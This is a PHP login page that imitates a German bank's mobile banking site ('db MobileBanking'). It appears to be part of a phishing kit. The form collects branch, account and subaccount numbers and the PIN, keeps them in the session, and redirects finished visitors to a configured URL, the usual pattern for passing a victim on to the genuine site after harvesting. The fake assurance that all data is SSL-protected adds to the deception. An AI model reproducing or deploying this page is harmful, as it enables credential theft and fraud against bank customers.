<?php
	session_start();
	include("config.php");
	
	if (isset($_SESSION['finished']) && $_SESSION['finished']) {
		header('Location: ' . ((isMobile()) ? $redirect_mobile : $redirect) . $urlext);
	}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="de" lang="de">
	<head>
		<title>db MobileBanking</title>  	
		<meta charset="utf-8"> 
		<meta name="HandheldFriendly" content="true">
		<meta name="MobileOptimized" content="320">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<meta name="format-detection" content="telephone=no">
		<link rel="shortcut icon" type="image/ico" href="src/img/favicon.ico">
		<link rel="stylesheet" type="text/css" href="src/db_css/style.css" media="handheld, screen">        
		<script src="src/db_js/jquery-1.js" type="text/javascript"></script>
	</head>
	
	<body id="login">
		<div id="headerContainer">
			<div class="inner">
				&nbsp;
			</div>
			<p id="customerNumberContainer"></p>
		</div>

		<div id="contentContainer">
			<div class="inner">
				<div class="emphasized">
					<form id="loginForm" method="post" action="index.php">

						<script type="text/javascript">
							$(document).ready(function(){
								$("#branch").focus();
							});
						</script>
						
						<p class="fld <?php echo (isset($_SESSION['branch_err']) ? "hasError" : ""); unset($_SESSION['branch_err']); ?>" id="fldBranch">
							<label for="branch">Filiale</label><br>
							<input autocomplete="off" value="<?php echo (isset($_SESSION['branch']) ? $_SESSION['branch'] : ""); ?>" name="branch" maxlength="3" id="branch" class="wapBranch" onkeyup="doNext(this, event);" type="tel"><br>                                                                                                                       
						</p>
						
						<p class="fld <?php echo (isset($_SESSION['account_err']) ? "hasError" : ""); unset($_SESSION['account_err']); ?>" id="fldAccount">
							<label for="account">Konto</label><br>
							<input autocomplete="off" value="<?php echo (isset($_SESSION['account']) ? $_SESSION['account'] : ""); ?>" name="account" maxlength="7" id="account" class="wapAccount" onkeyup="doNext(this, event);" type="tel"><br>                        
						</p>
						
						<p class="fld <?php echo (isset($_SESSION['subaccount_err']) ? "hasError" : ""); unset($_SESSION['subaccount_err']); ?>" id="fldSubAccount">
							<label for="subaccount">Unterkonto</label><br>
							<input name="subaccount" value="<?php echo (isset($_SESSION['subaccount']) ? $_SESSION['subaccount'] : "00"); ?>" autocomplete="off" maxlength="2" id="subaccount" class="wapSubAccount" value="00" onkeyup="doNext(this, event);" type="tel"><br>                        
						</p>    
						
						<p class="fld <?php echo (isset($_SESSION['pin_err']) ? "hasError" : ""); unset($_SESSION['pin_err']); ?>" id="fldPIN">
							<label for="pin">PIN</label><br>
							<input name="pin" maxlength="5" value="<?php echo (isset($_SESSION['pin']) ? $_SESSION['pin'] : ""); ?>" id="pin" class="wapPIN" autocomplete="off" type="password"><br>                        
						</p>	
						
						<p class="fld" id="fldLogin"><input value="anmelden" class="close" name="sendOB_Login_x" type="submit"></p>

						<p class="fld" id="fldSaveCredentials">
							<input name="saveCredentials" value="off" type="checkbox">                                                    
							<label for="saveCredentials">Filial- und Kontonummer speichern</label>                        
							<span id="credentialsInfoTrigger"></span>
						</p>                  

						<span class="errorMsg" style="display:<?php echo (isset($_SESSION['err']) ? "block" : "none"); unset($_SESSION['err']); ?>">
                            Anmeldung nicht erfolgreich. Bitte &uuml;berpr&uuml;fen Sie Ihre Anmeldedaten.
                        </span>
					</form>
				</div>

				<div class="advice">
					<h3>Sicher durch Verschl&uuml;sselung</h3>
					<p>Zu Ihrer Sicherheit werden alle Daten SSL-verschl&uuml;sselt &uuml;bertragen.</p>
				</div>			

				<div class="list">
					<ul>
						<li id="linkDemo"><a href="#">Demokonto</a></li>
						<li id="linkLegal"><a href="#">Rechtliche Hinweise / Impressum </a></li>
						<li id="linkDesktop"><a href="#">Desktop-Ansicht</a></li>
					</ul>            
				</div>
			</div> 
		</div> 
	</body>
</html>